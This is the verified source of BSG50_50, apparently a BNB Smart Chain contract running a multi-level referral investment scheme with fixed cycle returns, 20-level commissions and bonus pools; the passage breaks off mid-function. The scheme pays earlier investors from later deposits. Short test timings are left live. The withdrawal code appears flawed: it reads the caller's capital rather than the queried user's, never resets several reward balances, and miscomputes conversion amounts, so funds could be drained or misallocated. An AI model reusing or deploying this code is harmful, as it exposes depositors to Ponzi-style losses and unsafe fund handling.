/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

library SafeMath {
    
    /**
     * @dev Multiplies two unsigned integers, reverts on overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    /**
     * @dev Integer division of two unsigned integers truncating the quotient, reverts on division by zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
     * @dev Subtracts two unsigned integers, reverts on overflow (i.e. if subtrahend is greater than minuend).
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    /**
     * @dev Adds two unsigned integers, reverts on overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    /**
     * @dev Divides two unsigned integers and returns the remainder (unsigned integer modulo),
     * reverts when dividing by zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

interface IERC20 {
    function transfer(address to, uint256 value) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function totalSupply() external view returns (uint256);
    function balanceOf(address who) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal pure virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract SignVerify {

    function splitSignature(bytes memory sig)
        internal
        pure
        returns(uint8 v, bytes32 r, bytes32 s)
    {
        require(sig.length == 65);

        assembly {
            r := mload(add(sig, 32))
            s := mload(add(sig, 64))
            v := byte(0, mload(add(sig, 96)))
        }
        return (v, r, s);
    }

    function recoverSigner(bytes32 hash, bytes memory signature)
        internal
        pure
        returns(address)
    {
        (uint8 v, bytes32 r, bytes32 s) = splitSignature(signature);

        return ecrecover(hash, v, r, s);
    }

    function toString(address account)
        public
        pure 
        returns(string memory) {
        return toString(abi.encodePacked(account));
    }

    function toString(bytes memory data)
        internal
        pure
        returns(string memory) 
    {
        bytes memory alphabet = "0123456789abcdef";

        bytes memory str = new bytes(2 + data.length * 2);
        str[0] = "0";
        str[1] = "x";
        for (uint256 i = 0; i < data.length; i++) {
            str[2 + i * 2] = alphabet[uint256(uint8(data[i] >> 4))];
            str[3 + i * 2] = alphabet[uint256(uint8(data[i] & 0x0f))];
        }
        return string(str);
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() public {
        _transferOwnership(_msgSender());
    }
    modifier onlyOwner() {
        _checkOwner();
        _;
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract  BSG50_50 is Ownable, SignVerify{

    using SafeMath for uint256; 
    IERC20 public BUSD;

    uint256 private constant feePercents = 200; 
    uint256 private constant minDeposit = 50e18;
    uint256 private constant maxDeposit = 10000e18;
    uint256 private constant freezeIncomePercents = 3000;

    uint256 private constant baseDivider = 10000;

    
    uint256 private constant timeStep = 15 minutes;
    uint256 private constant dayPerCycle = 25 minutes;

    uint256 private constant dayReward2Percents = 1500000000000000000000;
    uint256 private constant dayRewardPercents = 1800000000000000000000;

    // uint256 private constant timeStep = 1 days;
    // uint256 private constant dayPerCycle = 15 days;

    // uint256 private constant dayReward2Percents = 200000000000000000001;
    // uint256 private constant dayRewardPercents = 166666666666666666667;

    uint256 private constant maxAddFreeze = 27 days;
    uint256 private constant referDepth = 20;

    uint256 private constant directPercents = 500;
    uint256[4] private level4Percents = [100, 200, 200, 200];
    uint256[15] private level5Percents = [100, 100, 100, 100, 100, 50, 50, 50, 50, 50, 50, 50, 50, 50, 50];

    uint256[20] private ROIlevel = [1500, 1250, 1000, 750, 500, 200, 200, 200, 200, 200, 100, 100, 100, 100, 100, 50, 50, 50, 50, 50];

    uint256 private constant silverPoolPercents = 50;
    uint256 private constant topPoolPercents = 50;
    uint256 private constant goldPoolPercents = 50;
    uint256 private constant platinumPoolPercents = 50;


    uint256[5] private balDown = [10e10, 30e10, 100e10, 500e10, 1000e10];
    uint256[5] private balDownRate = [1000, 1500, 2000, 5000, 6000]; 
    uint256[5] private balRecover = [15e10, 50e10, 150e10, 500e10, 1000e10];
    mapping(uint256=>bool) public balStatus;

    address[2] public feeReceivers;

    address public defaultRefer;
    uint256 public boosterDay = 30;
    uint256 public startTime;
    uint256 public lastDistribute;
    uint256 public totalUser; 
    uint256 public Silver;
    uint256 public Gold;
    uint256 public Platinum;
    uint256 public topPool;

    mapping(uint256 => address[3]) public dayTopUsers;
    mapping(address => uint256) public boosterUserTime;

    address[] public level3Users;
    address[] public level4Users;
    address[] public level5Users;
    address[] public boosterIncomeUSers;


    struct OrderInfo {
        uint256 amount; 
        uint256 start;
        uint256 unfreeze; 
        bool isUnfreezed;
    }

    mapping(address => OrderInfo[]) public orderInfos;

    address[] public depositors;

    struct UserInfo {
        address referrer;
        uint256 start;
        uint256 level; // 0, 1, 2, 3, 4, 5
        uint256 maxDeposit;
        uint256 totalDeposit;
        uint256 teamNum;
        uint256 maxDirectDeposit;
        uint256 teamTotalDeposit;
        uint256 totalFreezed;
        uint256 totalRevenue;
    }

    mapping(address => UserInfo) public userInfo;
    mapping(uint256 => mapping(address => uint256)) public userLayer1DayDeposit; // day=>user=>amount
    mapping(address => mapping(uint256 => address[])) public teamUsers;

    struct RewardInfo {
        uint256 capitals;
        uint256 statics;
        uint256 directs;
        uint256 level2to5;
        uint256 level6to20;
        uint256 split;
        uint256 splitDebt;
        uint256 Platinum;
        uint256 Silver;
        uint256 Gold;
        uint256 top;
        uint256 totalWithdrawls;
    }
    struct ROIReward {
        uint256 ROIReleased;
    }

    mapping(address => RewardInfo) public rewardInfo;
    mapping(address => ROIReward) public ROIreward;

    mapping(address => mapping(uint256 => uint256)) public depositRecord;
    mapping(address => uint256) public totalDeposits;

    bool public isFreezeReward;

    address public WETH;
    address public LpReceiver;
    IPancakePair public BNB_BUSD_LP;
    IPancakePair public ULE_BNB_LP;

    IPancakeRouter01 public Router;

    mapping (bytes32 => bool) public usedHash;
    address signerAddress;

    event Register(address user, address referral);
    event Deposit(address user, uint256 amount);
    event DepositBySplit(address user, uint256 amount);
    event TransferBySplit(address user, address receiver, uint256 amount);
    event Withdraw(address user, uint256 withdrawable);

    //// 0xe0e92035077c39594793e61802a350347c320cf2 busdbnblp

    /// 0xFC2F82f396e9C5C8E58A336C2e791EAe3d4e2777  ULE_BNB_LP

    //// Router: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3

    constructor(address _BUSDAddr, address _defaultRefer, address[2] memory _feeReceivers, 
        IPancakeRouter01 _Router,IPancakePair _BNB_BUSD_LP, IPancakePair _ULE_BNB_LP, address signerAddress_) public {
        BUSD = IERC20(_BUSDAddr);
        feeReceivers = _feeReceivers;
        startTime = block.timestamp;
        lastDistribute = block.timestamp;
        defaultRefer = _defaultRefer;
        Router = _Router;
        WETH = Router.WETH();
        BNB_BUSD_LP = _BNB_BUSD_LP;
        ULE_BNB_LP = _ULE_BNB_LP;
        signerAddress = signerAddress_;
    }

    function register(address _referral) external {
        require(userInfo[_referral].totalDeposit > 0 || _referral == defaultRefer, "invalid refer");
        UserInfo storage user = userInfo[msg.sender];
        require(user.referrer == address(0), "referrer bonded");
        user.referrer = _referral;
        user.start = block.timestamp;
        _updateTeamNum(msg.sender);
        totalUser = totalUser.add(1);
        emit Register(msg.sender, _referral);
    }
    receive() external payable {}
    function deposit(uint256 _nonce, bytes memory signature, uint256 _amount,uint256 _pkgNo) external payable{
        bytes32 hash = keccak256(   
              abi.encodePacked(   
                _nonce,
                _amount,
                _pkgNo
              )
          );

        require(!usedHash[hash], "Invalid Hash");
        require(recoverSigner(hash, signature) == signerAddress, "Signature Failed");   
        usedHash[hash] = true;

        uint256 FTMamount = msg.value;
        require (FTMamount > 0, "FTM amount");
        BUSD.transferFrom(msg.sender, address(this), _amount);
        totalDeposits[msg.sender] += 1;
        depositRecord[msg.sender][totalDeposits[msg.sender]] = _pkgNo;
        _deposit(msg.sender);
        emit Deposit(msg.sender, _amount);
    }

    function depositBySplit(uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        require(userInfo[msg.sender].totalDeposit == 0, "actived");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient split");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        _deposit(msg.sender);
        emit DepositBySplit(msg.sender, _amount);
    }

    function transferBySplit(address _receiver, uint256 _amount) external {
        require(_amount >= minDeposit && _amount.mod(minDeposit) == 0, "amount err");
        uint256 splitLeft = getCurSplit(msg.sender);
        require(splitLeft >= _amount, "insufficient income");
        rewardInfo[msg.sender].splitDebt = rewardInfo[msg.sender].splitDebt.add(_amount);
        rewardInfo[_receiver].split = rewardInfo[_receiver].split.add(_amount);
        emit TransferBySplit(msg.sender, _receiver, _amount);
    }

    function distributePoolRewards() public {
        if(block.timestamp > lastDistribute.add(timeStep))
        {
            uint256 dayNow = getCurDay();

            _distributeSilverStar();
            _distributeGoldStar();
            _distributePlatinumStar();

            _distributetopPool(dayNow);
            lastDistribute = block.timestamp;
        }
    }


    function BNBperBUSD() public view returns(uint256 _per)
    {
       (uint256 a,uint256 b, ) =  BNB_BUSD_LP.getReserves();
       uint256 z = (b*1e18)/a;
       return z;
    }
    function ULEperBNB() public view returns(uint256 _per)
    {
       (uint256 a,uint256 b, ) =  ULE_BNB_LP.getReserves();
       uint256 z = (b*1e18)/a;
       return z;
    }
    function BUSDperULE() public view returns(uint256 _per)
    {
        uint256 a = BNBperBUSD()/ULEperBNB();
        return a;
    }
    


    function getRewards(address _user) public view returns(uint256 , uint256 uleAmt, uint256 FTMamt, uint256){
        (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(_user);
        uint256 splitAmt = staticSplit;
        uint256 withdrawable = staticReward;
        uint256 withdrawAmt;

        (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        withdrawable = withdrawable.add(dynamicReward);
        splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        withdrawable = withdrawable.add(userRewards.capitals);

        uint256 slippageVal = (withdrawable.mul(275)).div(baseDivider);
        withdrawAmt = withdrawable.sub(slippageVal);
        withdrawAmt = withdrawAmt.div(2);
        uleAmt = withdrawAmt.mul(BUSDperULE());
        FTMamt = (withdrawAmt.mul(BNBperBUSD())).div(1e18);
        return(splitAmt, uleAmt, FTMamt, withdrawable);

        // return (splitAmt, withdrawable);
    }

    function withdraw() external {
        distributePoolRewards();
        // (uint256 splitAmt, uint256 withdrawable) = getRewards(msg.sender);
        (uint256 splitAmt, uint256 uleAmt, uint256 FTMamt, uint256 _withdrawable) = getRewards(msg.sender);
        // (uint256 uleAmt, uint256 FTMamt) = getCurPrice(withdrawable);
        // (uint256 staticReward, uint256 staticSplit) = _calCurStaticRewards(msg.sender);
        // uint256 splitAmt = staticSplit;
        // uint256 withdrawable = staticReward;

        // (uint256 dynamicReward, uint256 dynamicSplit) = _calCurDynamicRewards(msg.sender);
        // withdrawable = withdrawable.add(dynamicReward);
        // splitAmt = splitAmt.add(dynamicSplit);

        RewardInfo storage userRewards = rewardInfo[msg.sender];
        userRewards.split = userRewards.split.add(splitAmt);

        userRewards.statics = 0;

        userRewards.directs = 0;

        userRewards.Silver = 0;
        userRewards.top = 0;
        
        // withdrawable = withdrawable.add(userRewards.capitals);
        userRewards.capitals = 0;
        
        // BUSD.transfer(msg.sender, withdrawable);
        // userRewards.totalWithdrawls += withdrawable;

        BUSD.transfer(msg.sender, uleAmt);
        payable(msg.sender).transfer(FTMamt);
        userRewards.totalWithdrawls += _withdrawable;

        uint256 bal = BUSD.balanceOf(address(this));
        _setFreezeReward(bal);

        // emit Withdraw(msg.sender, withdrawable);
        emit Withdraw(msg.sender, uleAmt);
    }

    // function getCurPrice(uint256 _withdrawlVal) public pure returns(uint256 uleAmt, uint256 FTMamt) {
    //     uint256 withdrawAmt;
    //     uint256 slippageVal = (_withdrawlVal.mul(275)).div(baseDivider);
    //     withdrawAmt = _withdrawlVal.sub(slippageVal);
    //     withdrawAmt = withdrawAmt.div(2);
    //     uleAmt = withdrawAmt;
    //     FTMamt = withdrawAmt;
    //     return(uleAmt, FTMamt);
    // }

    function getCurROI(address _user) public view returns(uint256){
        RewardInfo storage userRewards = rewardInfo[_user];
        (uint256 staticReward ,) = _calCurStaticRewards(_user);
        return staticReward.add(userRewards.capitals);
    }

    function currentIncome(address _user) public view returns(uint256){
        (uint256 allreward, ) =_calCurDynamicRewards(_user);
        return allreward ;      
    }

    function getCurDay() public view returns(uint256) {
        return (block.timestamp.sub(startTime)).div(timeStep);
    }

    function getTeamUsersLength(address _user, uint256 _layer) external view returns(uint256) {
        return teamUsers[_user][_layer].length;
    }

    function getOrderLength(address _user) external view returns(uint256) {
        return orderInfos[_user].length;
    }

    function getDepositorsLength() external view returns(uint256) {
        return depositors.length;
    }

    function getMaxFreezing(address _user) public view returns(uint256) {
        uint256 maxFreezing;
        for(uint256 i = orderInfos[_user].length; i > 0; i--){
            OrderInfo storage order = orderInfos[_user][i - 1];
            if(order.unfreeze > block.timestamp){
                if(order.amount > maxFreezing){
                    maxFreezing = order.amount;
                }
            }else{
                break;
            }
        }
        return maxFreezing;
    }

    function getTeamDeposit(address _user) public view returns(uint256, uint256, uint256){
        uint256 totalTeam;
        uint256 maxTeam;
        uint256 otherTeam;
        for(uint256 i = 0; i < teamUsers[_user][0].length; i++){
            uint256 userTotalTeam = userInfo[teamUsers[_user][0][i]].teamTotalDeposit.add(userInfo[teamUsers[_user][0][i]].totalDeposit);
            totalTeam = totalTeam.add(userTotalTeam);
            if(userTotalTeam > maxTeam)
            {
                maxTeam = userTotalTeam;
            }
        }
        otherTeam = totalTeam.sub(maxTeam);
        return(maxTeam, otherTeam, totalTeam);
    }

    function getCurSplit(address _user) public view returns(uint256){
        (, uint256 staticSplit) = _calCurStaticRewards(_user);
        (, uint256 dynamicSplit) = _calCurDynamicRewards(_user);
        return rewardInfo[_user].split.add(staticSplit).add(dynamicSplit).sub(rewardInfo[_user].splitDebt);
    }

    function _calCurStaticRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.statics;
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _calCurDynamicRewards(address _user) private view returns(uint256, uint256) {
        RewardInfo storage userRewards = rewardInfo[_user];
        uint256 totalRewards = userRewards.directs.add(userRewards.level2to5).add(userRewards.level6to20);
        totalRewards = totalRewards.add(userRewards.Silver).add(userRewards.Gold).add(userRewards.Platinum).add(userRewards.top);
        uint256 splitAmt = totalRewards.mul(freezeIncomePercents).div(baseDivider);
        uint256 withdrawable = totalRewards.sub(splitAmt);
        return(withdrawable, splitAmt);
    }

    function _updateTeamNum(address _user) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamNum = userInfo[upline].teamNum.add(1);
                teamUsers[upline][i].push(_user);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateTopUser(address _user, uint256 _amount, uint256 _dayNow) private {
        userLayer1DayDeposit[_dayNow][_user] = userLayer1DayDeposit[_dayNow][_user].add(_amount);
        bool updated;
        for(uint256 i = 0; i < 3; i++){
            address topUser = dayTopUsers[_dayNow][i];
            if(topUser == _user){
                _reOrderTop(_dayNow);
                updated = true;
                break;
            }
        }
        if(!updated){
            address lastUser = dayTopUsers[_dayNow][2];
            if(userLayer1DayDeposit[_dayNow][lastUser] < userLayer1DayDeposit[_dayNow][_user]){
                dayTopUsers[_dayNow][2] = _user;
                _reOrderTop(_dayNow);
            }
        }
    }

    function _reOrderTop(uint256 _dayNow) private {
        for(uint256 i = 3; i > 1; i--){
            address topUser1 = dayTopUsers[_dayNow][i - 1];
            address topUser2 = dayTopUsers[_dayNow][i - 2];
            uint256 amount1 = userLayer1DayDeposit[_dayNow][topUser1];
            uint256 amount2 = userLayer1DayDeposit[_dayNow][topUser2];
            if(amount1 > amount2){
                dayTopUsers[_dayNow][i - 1] = topUser2;
                dayTopUsers[_dayNow][i - 2] = topUser1;
            }
        }
    }

    function _removeInvalidDeposit(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                if(userInfo[upline].teamTotalDeposit > _amount){
                    userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.sub(_amount);
                }else{
                    userInfo[upline].teamTotalDeposit = 0;
                }
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateReferInfo(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        address upline = user.referrer;
        for(uint256 i = 0; i < referDepth; i++){
            if(upline != address(0)){
                userInfo[upline].teamTotalDeposit = userInfo[upline].teamTotalDeposit.add(_amount);
                _updateLevel(upline);
                if(upline == defaultRefer) break;
                upline = userInfo[upline].referrer;
            }else{
                break;
            }
        }
    }

    function _updateLevel(address _user) private {
        UserInfo storage user = userInfo[_user];
        uint256 levelNow = _calLevelNow(_user);
        if(levelNow > user.level){
            user.level = levelNow;
            if(levelNow == 5){
                level5Users.push(_user);
            }
            if(levelNow == 4){
                level4Users.push(_user);
            }
            if(levelNow == 3){
                level3Users.push(_user);
            }
        }
    }

    function _calLevelNow(address _user) private view returns(uint256) {
        UserInfo storage user = userInfo[_user];
        uint256 total = user.totalDeposit;
        uint256 levelNow;
        (uint256 maxTeam, uint256 otherTeam, ) = getTeamDeposit(_user);
        if(total >= 200e18 && user.teamNum >= 6 && maxTeam >= 250e18 && otherTeam >= 250e18){
            levelNow = 5; // Platinumm
        }
        else if(total >= 100e18){
        if(total >= 100e18 && user.teamNum >= 4 && maxTeam >= 160e18 && otherTeam >= 160e18){
        levelNow = 4; // Gold     
        }else if(user.teamNum >= 2 && maxTeam >= 100e18 && otherTeam >= 100e18){
        levelNow = 3; // Silver
        }else{
        levelNow = 2;
        }
        }else if(total >= 50e18){
        levelNow = 1;
        }
        // if(total >= 2000e18 && user.teamNum >= 200 && maxTeam >= 25000e18 && otherTeam >= 25000e18){
        //     levelNow = 5; // Platinumm
        // }
        // else if(total >= 500e18){
        // if(total >= 1000e18 && user.teamNum >= 100 && maxTeam >= 16000e18 && otherTeam >= 16000e18){
        // levelNow = 4; // Gold     
        // }else if(user.teamNum >= 50 && maxTeam >= 10000e18 && otherTeam >= 10000e18){
        // levelNow = 3; // Silver
        // }else{
        // levelNow = 2;
        // }
        // }else if(total >= 100e18){
        // levelNow = 1;
        // }
        return levelNow;
    }

    function _deposit(address _user) private {
        UserInfo storage user = userInfo[_user];
        require(user.referrer != address(0), "register first");
        require(depositRecord[msg.sender][totalDeposits[msg.sender]] >= minDeposit, "less than min");
        require(depositRecord[msg.sender][totalDeposits[msg.sender]].mod(minDeposit) == 0 &&
        depositRecord[msg.sender][totalDeposits[msg.sender]] >= minDeposit, "mod err");
        require(user.maxDeposit == 0 || depositRecord[msg.sender][totalDeposits[msg.sender]] >= user.maxDeposit, "less before");
        boosterUserTime[_user] = getCurDay();
        (bool _isAvailable,) = boosterIncomeIsReady(user.referrer);
        if(user.maxDeposit == 0){
            user.maxDeposit = depositRecord[msg.sender][totalDeposits[msg.sender]];
        }else if(user.maxDeposit < depositRecord[msg.sender][totalDeposits[msg.sender]]){
            user.maxDeposit = depositRecord[msg.sender][totalDeposits[msg.sender]];
        }

        _distributeDeposit(depositRecord[msg.sender][totalDeposits[msg.sender]]);

        if(user.totalDeposit == 0){
            uint256 dayNow = getCurDay();
            _updateTopUser(user.referrer, depositRecord[msg.sender][totalDeposits[msg.sender]], dayNow);
        }

        depositors.push(_user);
        
        user.totalDeposit = user.totalDeposit.add(depositRecord[msg.sender][totalDeposits[msg.sender]]);
        user.totalFreezed = user.totalFreezed.add(depositRecord[msg.sender][totalDeposits[msg.sender]]);

        _updateLevel(msg.sender);

        uint256 addFreeze = (orderInfos[_user].length.div(2)).mul(timeStep);
        if(addFreeze > maxAddFreeze){
            addFreeze = maxAddFreeze;
        }
        uint256 unfreezeTime = block.timestamp.add(dayPerCycle).add(addFreeze);
        orderInfos[_user].push(OrderInfo(
            depositRecord[msg.sender][totalDeposits[msg.sender]], 
            block.timestamp, 
            unfreezeTime,
            false
        ));

        _unfreezeFundAndUpdateReward(msg.sender, depositRecord[msg.sender][totalDeposits[msg.sender]]);

        distributePoolRewards();

        _updateReferInfo(msg.sender, depositRecord[msg.sender][totalDeposits[msg.sender]]);

        _updateReward(msg.sender, depositRecord[msg.sender][totalDeposits[msg.sender]]);
        _updateROI(msg.sender);

        if(getBoosterTeamDeposit(user.referrer) && getTimeDiffer(user.referrer) <= boosterDay ){
            if(!_isAvailable)
            {boosterIncomeUSers.push(user.referrer);}
        }

        uint256 bal = BUSD.balanceOf(address(this));
        _balActived(bal);
        if(isFreezeReward){
            _setFreezeReward(bal);
        }
    }


    function _unfreezeFundAndUpdateReward(address _user, uint256 _amount) private {
        UserInfo storage user = userInfo[_user];
        bool isUnfreezeCapital;
        uint256 staticReward;

        for(uint256 i = 0; i < orderInfos[_user].length; i++){
            OrderInfo storage order = orderInfos[_user][i];
            (bool _isAvailable,) = boosterIncomeIsReady(_user);
            if(block.timestamp > order.unfreeze && _amount >= order.amount)
            {
                order.isUnfreezed = true;
                isUnfreezeCapital = true;
                
                if(user.totalFreezed > order.amount){
                    user.totalFreezed = user.totalFreezed.sub(order.amount);
                }else{
                    user.totalFreezed = 0;
                }
                
                _removeInvalidDeposit(_user, order.amount);


                if(_isAvailable == true)
                {
                 staticReward = (order.amount.mul(dayReward2Percents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
                else
                {
                 staticReward = (order.amount.mul(dayRewardPercents).mul(dayPerCycle).div(timeStep).div(baseDivider)).div(1e18);
                }
               
                if(isFreezeReward) {
                    if(user.totalFreezed > user.totalRevenue) {
                        uint256 leftCapital = user.totalFreezed.sub(user.totalRevenue);
                        if(staticReward > leftCapital) {
                            staticReward = leftCapital;
                        }
                    }else{
                        staticReward = 0;
                    }
                }
                rewardInfo[_user].capitals = rewardInfo[_user].capitals.add(order.amount);
                rewardInfo[_user].statics = rewardInfo[_user].statics.add(staticReward);
                user.totalRevenue = user.totalRevenue.add(staticReward);

                break;
            }
        }

        if(!isUnfreezeCapital){ 
            RewardInfo storage userReward = rewardInfo[_user];
            if(userReward.level6to20 > 0){
                uint256 release = _amount;
                if(_amount >= userReward.level6to20){
                    release = userReward.level6to20;
                }
                userReward.level6to20 = userReward.level6to20.sub(release);
                user.totalRevenue = user.totalRevenue.add(release);
            }
        }
    }


    function _distributeSilverStar() private {
        uint256 level3Count;
        for(uint256 i = 0; i < level3Users.length; i++){
            if(userInfo[level3Users[i]].level == 3){
                level3Count = level3Count.add(1);
            }
        }
        if(level3Count > 0){
            uint256 reward = Silver.div(level3Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level3Users.length; i++){
                if(userInfo[level3Users[i]].level == 3){
                    rewardInfo[level3Users[i]].Silver = rewardInfo[level3Users[i]].Silver.add(reward);
                    userInfo[level3Users[i]].totalRevenue = userInfo[level3Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(Silver > totalReward){
                Silver = Silver.sub(totalReward);
            }else{
                Silver = 0;
            }
        }
    }

    function _distributeGoldStar() private {
        uint256 level4Count;
        for(uint256 i = 0; i < level4Users.length; i++){
            if(userInfo[level4Users[i]].level == 4){
                level4Count = level4Count.add(1);
            }
        }
        if(level4Count > 0){
            uint256 reward = Gold.div(level4Count);
            uint256 totalReward;
            for(uint256 i = 0; i < level4Users.length; i++){
                if(userInfo[level4Users[i]].level == 4){
                    rewardInfo[level4Users[i]].Gold = rewardInfo[level4Users[i]].Gold.add(reward);
                    userInfo[level4Users[i]].totalRevenue = userInfo[level4Users[i]].totalRevenue.add(reward);
                    totalReward = totalReward.add(reward);
                }
            }
            if(Gold > totalReward){
                Gold = Gold.sub(totalReward);
            }else{
                Gold = 0;
            }
        }
    }

    function _distributePlatinumStar() private {

        uint256 level5Count;
